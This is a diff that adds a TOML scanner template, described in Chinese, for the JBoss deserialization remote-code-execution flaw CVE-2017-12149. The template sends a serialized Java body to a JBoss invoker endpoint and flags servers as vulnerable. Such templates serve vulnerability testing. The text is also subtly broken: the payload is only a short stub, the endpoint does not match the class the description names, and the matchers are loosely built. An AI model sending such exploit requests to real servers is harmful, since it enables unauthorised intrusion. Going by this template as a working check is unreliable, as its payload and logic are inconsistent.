@@ -1,0 +1,40 @@
+[info]
+author = "ave"
+description = "该PoC针对JBoss Application Server的HTTP Invoker反序列化漏洞进行验证，通过发送特制的序列化数据触发对ReadOnlyAccessFilter类的反序列化漏洞，实现远程代码执行。该漏洞影响Red Hat Enterprise Application Platform 5.2及JBoss 5.x/6.x版本，攻击者无需认证即可利用。"
+id = "POC-AVE-2017-0308"
+name = "CVE-2017-12149 JBoss反序列化RCE漏洞PoC"
+severity = "critical"
+tags = ["ave-2017-0308"]
+vuln_id = [
+    "CVE-2017-12149",
+    "AVE-2017-0308",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/invoker/EJBInvokerServlet"
+protocol = "http"
+
+[poc.requests.body]
+content = "rO0ABXNhYrMjw=="
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-java-serialized-object"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+status = [200]
+type = "status"
+words = ["vulnerable"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["JBoss"]
